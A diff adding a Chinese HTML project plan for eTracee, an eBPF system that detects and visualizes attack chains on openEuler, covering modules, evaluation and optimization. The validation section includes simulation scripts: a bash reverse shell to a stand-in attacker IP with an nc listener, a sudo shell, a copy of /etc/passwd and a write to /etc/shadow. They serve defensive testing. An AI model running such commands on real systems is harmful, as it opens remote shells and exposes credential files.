@@ -1,0 +1,1318 @@
+<!DOCTYPE html><html lang="zh-CN"><head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>eTracee：面向国产操作系统的轻量级 eBPF 攻击链可视化系统</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&amp;family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+    <style>
+        :root {
+            --color-primary: #2563eb;
+            --color-secondary: #64748b;
+            --color-accent: #0ea5e9;
+            --color-muted: #f1f5f9;
+            --color-border: #e2e8f0;
+        }
+        
+        body { 
+            font-family: 'Inter', sans-serif; 
+            line-height: 1.6;
+            color: #334155;
+        }
+        
+        .serif { font-family: 'Playfair Display', serif; }
+        
+        .toc-fixed {
+            position: fixed;
+            top: 2rem;
+            left: 2rem;
+            width: 280px;
+            max-height: calc(100vh - 4rem);
+            overflow-y: auto;
+            z-index: 50;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--color-border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        
+        .main-content {
+            margin-left: 320px;
+            max-width: 900px;
+            padding: 2rem;
+        }
+        
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+            margin-bottom: 3rem;
+            align-items: center;
+        }
+        
+        .bento-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            padding: 2rem;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .bento-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+        
+        .bento-card h1 {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .citation {
+            display: inline-block;
+            background: var(--color-accent);
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            text-decoration: none;
+            margin: 0 2px;
+            transition: all 0.2s;
+        }
+        
+        .citation:hover {
+            background: var(--color-primary);
+            transform: translateY(-1px);
+        }
+        
+        .module-card {
+            background: white;
+            border: 1px solid var(--color-border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .module-card:hover {
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .timeline-item {
+            border-left: 3px solid var(--color-accent);
+            padding-left: 1.5rem;
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -8px;
+            top: 0.5rem;
+            width: 12px;
+            height: 12px;
+            background: var(--color-accent);
+            border-radius: 50%;
+        }
+        
+        @media (max-width: 1024px) {
+            .toc-fixed {
+                display: none;
+            }
+            .main-content {
+                margin-left: 0;
+                max-width: 100%;
+            }
+            .hero-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                padding: 1rem;
+            }
+            .hero-grid {
+                grid-template-columns: 1fr;
+            }
+            .bento-card h1 {
+                font-size: 1.8rem;
+                line-height: 1.2;
+            }
+            .bento-card p {
+                font-size: 1rem;
+            }
+            .hero-grid img {
+                height: auto;
+                max-width: 100%;
+            }
+            .module-card {
+                word-wrap: break-word;
+            }
+        }
+    </style>
+  <base target="_blank">
+</head>
+
+  <body class="bg-gray-50">
+    <!-- Fixed Table of Contents -->
+    <nav class="toc-fixed">
+      <h3 class="text-lg font-semibold text-gray-800 mb-4 serif">目录导航</h3>
+      <ul class="space-y-2 text-sm">
+        <li>
+          <a href="#overview" class="text-gray-600 hover:text-blue-600 transition-colors">项目概述</a>
+        </li>
+        <li>
+          <a href="#validation" class="text-gray-600 hover:text-blue-600 transition-colors">有效性验证</a>
+        </li>
+        <li>
+          <a href="#optimization" class="text-gray-600 hover:text-blue-600 transition-colors">方案优化</a>
+        </li>
+        <li>
+          <a href="#usability" class="text-gray-600 hover:text-blue-600 transition-colors">可用性提升</a>
+        </li>
+        <li>
+          <a href="#timeline" class="text-gray-600 hover:text-blue-600 transition-colors">开发计划</a>
+        </li>
+        <li>
+          <a href="#technical" class="text-gray-600 hover:text-blue-600 transition-colors">技术细节</a>
+        </li>
+      </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <!-- Hero Section -->
+      <section class="hero-grid">
+        <div class="bento-card">
+          <h1 class="text-4xl font-bold mb-4 serif italic">
+            eTracee：面向国产操作系统的
+            <br/>
+            <span class="text-cyan-200">轻量级 eBPF 攻击链</span>
+            <br/>
+            可视化系统
+          </h1>
+          <p class="text-lg text-blue-100 mb-6">
+            革命性的内核级安全监控平台，专为 openEuler 25.09 优化设计
+          </p>
+          <div class="flex space-x-4">
+            <span class="bg-white/20 px-3 py-1 rounded-full text-sm">eBPF 技术</span>
+            <span class="bg-white/20 px-3 py-1 rounded-full text-sm">攻击链可视化</span>
+            <span class="bg-white/20 px-3 py-1 rounded-full text-sm">轻量级 AI</span>
+          </div>
+        </div>
+        <div class="bg-white rounded-16 p-6 border border-gray-200">
+          <img src="https://kimi-web-img.moonshot.cn/img/tanjunchen.github.io/a4f671beeaed8571535474f9280e00c95fba82c3.png" alt="eBPF安全监控技术概念图" class="w-full h-48 object-cover rounded-8 mb-4" size="medium" aspect="wide" query="eBPF 安全监控" referrerpolicy="no-referrer" data-modified="1" data-score="0.00"/>
+          <h3 class="text-lg font-semibold mb-2">核心创新</h3>
+          <p class="text-sm text-gray-600">通过 eBPF 技术实现内核级事件捕获，构建动态攻击链图谱，提供直观的安全威胁可视化分析</p>
+        </div>
+      </section>
+
+      <!-- Executive Summary -->
+      <section class="bg-white rounded-16 p-8 border border-gray-200 mb-12">
+        <h2 class="text-2xl font-bold mb-6 serif">执行摘要</h2>
+        <div class="grid md:grid-cols-2 gap-6">
+          <div>
+            <h3 class="font-semibold text-lg mb-3">项目背景</h3>
+            <p class="text-gray-600 mb-4">
+              随着云计算和容器化技术的普及，现代操作系统面临日益复杂的安全威胁。传统的安全监控方案存在性能开销大、侵入性强等问题。eBPF 技术的出现为内核级安全监控提供了革命性解决方案<a href="#ref-131" class="citation">131</a>。
+            </p>
+          </div>
+          <div>
+            <h3 class="font-semibold text-lg mb-3">核心优势</h3>
+            <ul class="text-gray-600 space-y-2">
+              <li><i class="fas fa-check text-green-500 mr-2"></i>轻量级设计，资源消耗低</li>
+              <li><i class="fas fa-check text-green-500 mr-2"></i>攻击链可视化，直观展示威胁路径</li>
+              <li><i class="fas fa-check text-green-500 mr-2"></i>AI 驱动的异常检测</li>
+              <li><i class="fas fa-check text-green-500 mr-2"></i>自动化报告生成</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- Project Overview -->
+      <section id="overview" class="mb-16">
+        <h2 class="text-3xl font-bold mb-8 serif">项目概述与核心目标</h2>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">1.1 项目背景与定位</h3>
+          <div class="prose prose-lg text-gray-600">
+            <p>
+              随着云计算和容器化技术的普及，现代操作系统面临着日益复杂和隐蔽的安全威胁。传统的基于内核模块或用户态代理的安全监控方案，往往存在性能开销大、侵入性强、易被绕过等问题。eBPF（extended Berkeley Packet Filter）技术的出现，为内核级别的安全监控提供了一种革命性的解决方案。它允许在内核中安全、高效地运行沙箱程序，实现对系统调用、网络事件等关键行为的深度观测，而无需修改内核源码或加载内核模块<a href="#ref-131" class="citation">131</a>。
+            </p>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">1.2 核心功能模块</h3>
+          <div class="grid gap-4">
+            <div class="module-card">
+              <div class="flex items-start space-x-4">
+                <div class="bg-blue-100 p-3 rounded-lg">
+                  <i class="fas fa-microchip text-blue-600 text-xl"></i>
+                </div>
+                <div class="flex-1">
+                  <h4 class="text-lg font-semibold mb-2">eBPF 系统调用捕获</h4>
+                  <p class="text-gray-600 text-sm mb-3">
+                    利用 eBPF 技术实时捕获系统调用事件，采用 CO-RE 模式保证跨内核版本兼容性<a href="#ref-154" class="citation">154</a>
+                    <a href="#ref-122" class="citation">122</a>。
+                  </p>
+                  <div class="flex space-x-2">
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded text-xs">libbpf</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded text-xs">Ring Buffer</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="module-card">
+              <div class="flex items-start space-x-4">
+                <div class="bg-green-100 p-3 rounded-lg">
+                  <i class="fas fa-filter text-green-600 text-xl"></i>
+                </div>
+                <div class="flex-1">
+                  <h4 class="text-lg font-semibold mb-2">日志规则匹配引擎</h4>
+                  <p class="text-gray-600 text-sm mb-3">
+                    轻量级规则引擎，灵感来源于 Falco 和 Tracee，支持 YAML 格式规则定义<a href="#ref-118" class="citation">118</a>
+                    <a href="#ref-120" class="citation">120</a>。
+                  </p>
+                  <div class="flex space-x-2">
+                    <span class="bg-green-100 text-green-800 px-2 py-1 rounded text-xs">规则引擎</span>
+                    <span class="bg-green-100 text-green-800 px-2 py-1 rounded text-xs">实时匹配</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="module-card">
+              <div class="flex items-start space-x-4">
+                <div class="bg-purple-100 p-3 rounded-lg">
+                  <i class="fas fa-project-diagram text-purple-600 text-xl"></i>
+                </div>
+                <div class="flex-1">
+                  <h4 class="text-lg font-semibold mb-2">攻击链图谱可视化</h4>
+                  <p class="text-gray-600 text-sm mb-3">
+                    核心创新功能，将离散事件关联成可视化的攻击链图谱，通过 D3.js 实现力导向图布局<a href="#ref-156" class="citation">156</a>。
+                  </p>
+                  <div class="flex space-x-2">
+                    <span class="bg-purple-100 text-purple-800 px-2 py-1 rounded text-xs">D3.js</span>
+                    <span class="bg-purple-100 text-purple-800 px-2 py-1 rounded text-xs">力导向图</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="module-card">
+              <div class="flex items-start space-x-4">
+                <div class="bg-orange-100 p-3 rounded-lg">
+                  <i class="fas fa-brain text-orange-600 text-xl"></i>
+                </div>
+                <div class="flex-1">
+                  <h4 class="text-lg font-semibold mb-2">轻量 AI 异常检测</h4>
+                  <p class="text-gray-600 text-sm mb-3">
+                    基于 Isolation Forest 等无监督学习算法，构建进程行为基线模型，发现未知威胁<a href="#ref-138" class="citation">138</a>。
+                  </p>
+                  <div class="flex space-x-2">
+                    <span class="bg-orange-100 text-orange-800 px-2 py-1 rounded text-xs">Isolation Forest</span>
+                    <span class="bg-orange-100 text-orange-800 px-2 py-1 rounded text-xs">异常检测</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="module-card">
+              <div class="flex items-start space-x-4">
+                <div class="bg-red-100 p-3 rounded-lg">
+                  <i class="fas fa-file-alt text-red-600 text-xl"></i>
+                </div>
+                <div class="flex-1">
+                  <h4 class="text-lg font-semibold mb-2">自动化报告生成</h4>
+                  <p class="text-gray-600 text-sm mb-3">
+                    根据告警信息和攻击链图谱，自动生成结构化的安全分析报告，支持 PDF/HTML 格式导出。
+                  </p>
+                  <div class="flex space-x-2">
+                    <span class="bg-red-100 text-red-800 px-2 py-1 rounded text-xs">报告模板</span>
+                    <span class="bg-red-100 text-red-800 px-2 py-1 rounded text-xs">自动化生成</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">1.3 技术选型与架构原则</h3>
+          <div class="grid md:grid-cols-3 gap-6">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="font-semibold text-lg mb-3 flex items-center">
+                <i class="fas fa-code text-blue-600 mr-2"></i>
+                多语言技术栈
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li><strong>C 语言：</strong>用于编写 eBPF 内核态程序</li>
+                <li><strong>Go 语言：</strong>构建高性能后端服务</li>
+                <li><strong>Python：</strong>实现 AI 模型和报告生成</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="font-semibold text-lg mb-3 flex items-center">
+                <i class="fas fa-github text-green-600 mr-2"></i>
+                开源项目参考
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>
+                  <a href="#ref-119" class="citation">119</a>
+                  <a href="#ref-123" class="citation">123</a> Tracee (Aqua Security)
+                </li>
+                <li>
+                  <a href="#ref-118" class="citation">118</a> Falco (Sysdig)
+                </li>
+                <li>libbpf-bootstrap 项目模板</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="font-semibold text-lg mb-3 flex items-center">
+                <i class="fas fa-feather text-purple-600 mr-2"></i>
+                轻量化设计
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li><strong>存储：</strong>SQLite 嵌入式数据库</li>
+                <li><strong>AI 模型：</strong>轻量级、易于解释的算法</li>
+                <li><strong>架构：</strong>模块化设计，独立部署</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Validation Section -->
+      <section id="validation" class="mb-16">
+        <h2 class="text-3xl font-bold mb-8 serif">系统有效性验证与攻击模拟方案</h2>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">2.1 攻击模拟策略设计</h3>
+
+          <div class="mb-8">
+            <h4 class="text-xl font-semibold mb-4">2.1.1 模拟攻击场景定义</h4>
+
+            <div class="grid gap-6">
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h5 class="font-semibold text-lg mb-3 text-red-600">
+                  <i class="fas fa-terminal mr-2"></i>反弹 Shell 检测
+                </h5>
+                <p class="text-gray-600 mb-4">
+                  监控
+                  <code>connect</code> 系统调用，当进程（如 bash）的标准输入输出重定向到网络套接字时触发告警<a href="#ref-252" class="citation">252</a>。
+                </p>
+                <div class="bg-gray-50 p-3 rounded text-sm">
+                  <strong>检测条件：</strong>comm=bash &amp;&amp; fd∈{0,1,2} &amp;&amp; 网络连接
+                </div>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h5 class="font-semibold text-lg mb-3 text-orange-600">
+                  <i class="fas fa-user-shield mr-2"></i>权限提升行为
+                </h5>
+                <p class="text-gray-600 mb-4">
+                  通过监控
+                  <code>execve</code> 系统调用，检测 sudo、su 或 SUID 二进制文件的执行，识别权限提升尝试。
+                </p>
+                <div class="bg-gray-50 p-3 rounded text-sm">
+                  <strong>检测条件：</strong>execve(/bin/bash) &amp;&amp; UID变化(非0→0)
+                </div>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h5 class="font-semibold text-lg mb-3 text-purple-600">
+                  <i class="fas fa-lock mr-2"></i>敏感文件异常访问
+                </h5>
+                <p class="text-gray-600 mb-4">
+                  监控对
+                  <code>/etc/shadow</code>、
+                  <code>/etc/passwd</code> 等敏感文件的访问模式，检测异常读写行为。
+                </p>
+                <div class="bg-gray-50 p-3 rounded text-sm">
+                  <strong>检测条件：</strong>openat(/etc/shadow) &amp;&amp; 写入权限 &amp;&amp; 非特权用户
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="mb-8">
+            <h4 class="text-xl font-semibold mb-4">2.1.2 攻击模拟脚本开发</h4>
+
+            <div class="bg-gray-50 rounded-lg p-6 border border-gray-200 mb-6">
+              <h5 class="font-semibold mb-3">反弹 Shell 模拟脚本</h5>
+              <pre class="bg-gray-800 text-green-400 p-4 rounded text-sm overflow-x-auto"><code>#!/bin/bash
+# reverse_shell_simulator.sh
+ATTACKER_IP=&#34;127.0.0.1&#34;
+ATTACKER_PORT=&#34;4444&#34;
+
+# 启动监听
+nc -lvp $ATTACKER_PORT &amp;
+
+# 执行反弹 shell
+/bin/bash -i &gt;&amp; /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0&gt;&amp;1</code></pre>
+            </div>
+
+            <div class="bg-gray-50 rounded-lg p-6 border border-gray-200 mb-6">
+              <h5 class="font-semibold mb-3">权限提升模拟脚本</h5>
+              <pre class="bg-gray-800 text-green-400 p-4 rounded text-sm overflow-x-auto"><code>#!/bin/bash
+# privilege_escalation_simulator.sh
+sudo /bin/bash -c &#34;whoami &gt; /tmp/whoami_result.txt&#34;</code></pre>
+            </div>
+
+            <div class="bg-gray-50 rounded-lg p-6 border border-gray-200">
+              <h5 class="font-semibold mb-3">敏感文件访问模拟脚本</h5>
+              <pre class="bg-gray-800 text-green-400 p-4 rounded text-sm overflow-x-auto"><code>#!/bin/bash
+# sensitive_file_access_simulator.sh
+cat /etc/passwd &gt; /tmp/passwd_copy.txt
+echo &#34;test&#34; &gt;&gt; /etc/shadow  # 此操作应失败但会被捕获</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">2.2 系统有效性评估方法</h3>
+
+          <div class="grid md:grid-cols-2 gap-8">
+            <div>
+              <h4 class="text-xl font-semibold mb-4">2.2.1 检测准确性评估</h4>
+              <div class="space-y-4">
+                <div class="bg-white rounded-lg p-4 border border-gray-200">
+                  <h5 class="font-semibold mb-2">真阳性率 (TPR) 与假阳性率 (FPR)</h5>
+                  <div class="text-sm text-gray-600 space-y-1">
+                    <div><strong>TPR = TP / (TP + FN)</strong> - 理想值 100%</div>
+                    <div><strong>FPR = FP / (FP + TN)</strong> - 理想值 0%</div>
+                  </div>
+                </div>
+
+                <div class="bg-white rounded-lg p-4 border border-gray-200">
+                  <h5 class="font-semibold mb-2">规则引擎匹配测试</h5>
+                  <p class="text-sm text-gray-600">
+                    为每个攻击场景编写对应的检测规则，验证规则引擎的匹配能力和边界条件处理。
+                  </p>
+                </div>
+
+                <div class="bg-white rounded-lg p-4 border border-gray-200">
+                  <h5 class="font-semibold mb-2">AI 模型评估</h5>
+                  <p class="text-sm text-gray-600">
+                    使用准确率、精确率、召回率和 F1 分数评估 Isolation Forest 模型的性能。
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div>
+              <h4 class="text-xl font-semibold mb-4">2.2.2 性能与资源消耗评估</h4>
+              <div class="space-y-4">
+                <div class="bg-white rounded-lg p-4 border border-gray-200">
+                  <h5 class="font-semibold mb-2">事件捕获吞吐量</h5>
+                  <p class="text-sm text-gray-600">
+                    使用
+                    <code>bpftool</code> 和
+                    <code>perf</code> 监控 eBPF 程序性能，测试不同负载下的捕获能力。
+                  </p>
+                </div>
+
+                <div class="bg-white rounded-lg p-4 border border-gray-200">
+                  <h5 class="font-semibold mb-2">系统资源占用</h5>
+                  <p class="text-sm text-gray-600">
+                    目标：CPU 占用率 &lt; 5%，内存占用 &lt; 100MB。
+                  </p>
+                </div>
+
+                <div class="bg-white rounded-lg p-4 border border-gray-200">
+                  <h5 class="font-semibold mb-2">存储空间增长</h5>
+                  <p class="text-sm text-gray-600">
+                    评估 SQLite 数据库的增长速率，为日志轮转策略提供依据。
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">2.3 自动化测试框架</h3>
+
+          <div class="bg-white rounded-lg p-6 border border-gray-200">
+            <h4 class="text-xl font-semibold mb-4">集成测试脚本</h4>
+            <p class="text-gray-600 mb-4">
+              编写主控脚本
+              <code>run_integration_test.sh</code>，自动化执行以下流程：
+            </p>
+            <ol class="list-decimal list-inside space-y-2 text-sm text-gray-600">
+              <li>启动 eTracee 系统</li>
+              <li>运行攻击模拟脚本序列</li>
+              <li>验证告警和事件记录</li>
+              <li>收集性能数据</li>
+              <li>生成测试报告</li>
+            </ol>
+          </div>
+        </div>
+      </section>
+
+      <!-- Optimization Section -->
+      <section id="optimization" class="mb-16">
+        <h2 class="text-3xl font-bold mb-8 serif">方案优化与冗余消除</h2>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">3.1 现有方案分析与评价</h3>
+
+          <div class="bg-amber-50 border border-amber-200 rounded-lg p-6 mb-8">
+            <div class="flex items-start space-x-3">
+              <i class="fas fa-exclamation-triangle text-amber-600 mt-1"></i>
+              <div>
+                <h4 class="font-semibold text-amber-800 mb-2">潜在冗余识别</h4>
+                <ul class="text-amber-700 text-sm space-y-1">
+                  <li><strong>日志与存储模块重叠：</strong>告警数据重复存储在 alerts.log 和 SQLite 中</li>
+                  <li><strong>规则引擎与 AI 检测协同不足：</strong>两者相对独立，可能导致重复告警</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <div class="grid md:grid-cols-2 gap-8">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="font-semibold text-lg mb-4">原方案问题</h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>周 3 和周 4 任务可以合并优化</li>
+                <li>数据流转存在冗余环节</li>
+                <li>跨语言通信机制考虑较晚</li>
+                <li>规则引擎与 AI 模块协同不足</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="font-semibold text-lg mb-4">优化方向</h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>合并事件处理与过滤中心</li>
+                <li>统一数据存储格式</li>
+                <li>优化 Go-Python 通信机制</li>
+                <li>引入现代化开发工具</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">3.2 优化后的实现步骤</h3>
+
+          <div class="space-y-6">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-sync-alt text-blue-600 mr-2"></i>
+                合并与简化数据处理流程
+              </h4>
+              <p class="text-gray-600 mb-4">
+                将周 3 和周 4 任务合并为&#34;事件处理与过滤中心&#34;，统一处理事件过滤、规则匹配和存储逻辑。
+              </p>
+              <div class="bg-gray-50 p-4 rounded">
+                <strong>数据流优化：</strong>
+                <code>原始事件 → 过滤中心 → {规则引擎, 事件存储}</code>
+              </div>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-exchange-alt text-green-600 mr-2"></i>
+                优化跨语言通信机制
+              </h4>
+              <p class="text-gray-600 mb-4">
+                采用轻量级消息队列（如 Redis Stream）作为 Go 后端与 Python AI 模块的通信中间件，实现异步解耦。
+              </p>
+              <div class="bg-gray-50 p-4 rounded">
+                <strong>通信模式：</strong>
+                <code>Go → Redis Queue → Python AI → 结果写回</code>
+              </div>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-tools text-purple-600 mr-2"></i>
+                提升开发效率的工具与脚本
+              </h4>
+              <div class="grid md:grid-cols-3 gap-4">
+                <div>
+                  <h5 class="font-semibold mb-2">Python 项目管理</h5>
+                  <p class="text-sm text-gray-600">
+                    使用
+                    <code>Poetry</code> 管理虚拟环境、依赖和包发布<a href="#ref-247" class="citation">247</a>
+                    <a href="#ref-248" class="citation">248</a>。
+                  </p>
+                </div>
+                <div>
+                  <h5 class="font-semibold mb-2">自动化构建</h5>
+                  <p class="text-sm text-gray-600">
+                    使用
+                    <code>Makefile</code> 管理构建、测试和部署流程。
+                  </p>
+                </div>
+                <div>
+                  <h5 class="font-semibold mb-2">代码生成</h5>
+                  <p class="text-sm text-gray-600">
+                    利用
+                    <code>libbpf-bootstrap</code> 和
+                    <code>bpftool</code> 自动生成 eBPF 骨架代码<a href="#ref-236" class="citation">236</a>。
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Usability Section -->
+      <section id="usability" class="mb-16">
+        <h2 class="text-3xl font-bold mb-8 serif">系统可用性提升策略</h2>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">4.1 检测准确性提升</h3>
+
+          <div class="grid md:grid-cols-2 gap-8">
+            <div>
+              <h4 class="text-xl font-semibold mb-4">规则引擎优化</h4>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200 mb-6">
+                <h5 class="font-semibold mb-3 flex items-center">
+                  <i class="fas fa-shield-alt text-blue-600 mr-2"></i>
+                  基于 MITRE ATT&amp;CK 的规则设计
+                </h5>
+                <p class="text-gray-600 text-sm mb-3">
+                  以 MITRE ATT&amp;CK 框架为参考，将攻击技术映射到具体的系统调用行为，构建结构化、可扩展的规则体系。
+                </p>
+                <div class="space-y-2 text-sm">
+                  <div><strong>T1059.004:</strong> Unix Shell 检测</div>
+                  <div><strong>T1083:</strong> 文件和目录发现</div>
+                  <div><strong>T1059:</strong> 命令和脚本解释器</div>
+                </div>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h5 class="font-semibold mb-3 flex items-center">
+                  <i class="fas fa-sync text-green-600 mr-2"></i>
+                  规则动态加载与热更新
+                </h5>
+                <p class="text-gray-600 text-sm">
+                  使用
+                  <code>inotify</code> 监控规则文件变化，自动重新加载新规则，无需重启系统。
+                </p>
+              </div>
+            </div>
+
+            <div>
+              <h4 class="text-xl font-semibold mb-4">AI 异常检测模型优化</h4>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200 mb-6">
+                <h5 class="font-semibold mb-3 flex items-center">
+                  <i class="fas fa-chart-line text-purple-600 mr-2"></i>
+                  特征工程改进
+                </h5>
+                <div class="space-y-3 text-sm text-gray-600">
+                  <div>
+                    <strong>系统调用频率与分布：</strong>构建频率向量，检测异常组合
+                  </div>
+                  <div>
+                    <strong>文件访问模式：</strong>路径、类型、访问模式的分析
+                  </div>
+                  <div>
+                    <strong>网络连接行为：</strong>目标 IP、端口、频率监控
+                  </div>
+                  <div>
+                    <strong>进程执行链：</strong>父子关系追踪，进程树构建
+                  </div>
+                </div>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h5 class="font-semibold mb-3 flex items-center">
+                  <i class="fas fa-tree text-orange-600 mr-2"></i>
+                  模型选择与调优
+                </h5>
+                <p class="text-gray-600 text-sm mb-3">
+                  采用 <strong>Isolation Forest</strong> 算法，基于异常数据点&#34;稀少&#34;且&#34;不同&#34;的特性进行检测<a href="#ref-229" class="citation">229</a>。
+                </p>
+                <div class="text-xs text-gray-500">
+                  参数调整：n_estimators, contamination
+                  <br/>
+                  增量学习：适应业务变化
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">4.2 资源消耗优化</h3>
+
+          <div class="grid md:grid-cols-3 gap-6">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-microchip text-blue-600 mr-2"></i>
+                eBPF 程序性能
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li><strong>CO-RE 技术：</strong>一次编译，到处运行<a href="#ref-236" class="citation">236</a>
+                </li>
+                <li><strong>批量提交：</strong>减少系统调用次数</li>
+                <li><strong>per-CPU Ring Buffer：</strong>避免多核竞争</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-server text-green-600 mr-2"></i>
+                后端服务优化
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li><strong>数据采样：</strong>白名单过滤、自适应采样</li>
+                <li><strong>批量写入：</strong>减少数据库 I/O 压力</li>
+                <li><strong>内存缓存：</strong>加速规则匹配和 API 响应</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-eye text-purple-600 mr-2"></i>
+                前端可视化
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li><strong>虚拟化渲染：</strong>只渲染视口内元素</li>
+                <li><strong>WebGL 加速：</strong>利用 GPU 并行计算</li>
+                <li><strong>节点聚簇：</strong>宏观把握，逐步深入</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">4.3 可解释性增强</h3>
+
+          <div class="grid md:grid-cols-2 gap-8">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-brain text-blue-600 mr-2"></i>
+                AI 模型可解释性
+              </h4>
+              <div class="space-y-4">
+                <div>
+                  <h5 class="font-semibold text-sm mb-2">异常评分依据展示</h5>
+                  <p class="text-sm text-gray-600">
+                    展示事件在各特征维度的得分，以及最终异常评分的计算依据。
+                  </p>
+                </div>
+                <div>
+                  <h5 class="font-semibold text-sm mb-2">关键特征贡献度分析</h5>
+                  <p class="text-sm text-gray-600">
+                    使用 SHAP 等技术计算特征贡献度，帮助定位异常根本原因。
+                  </p>
+                </div>
+              </div>
+            </div>
+
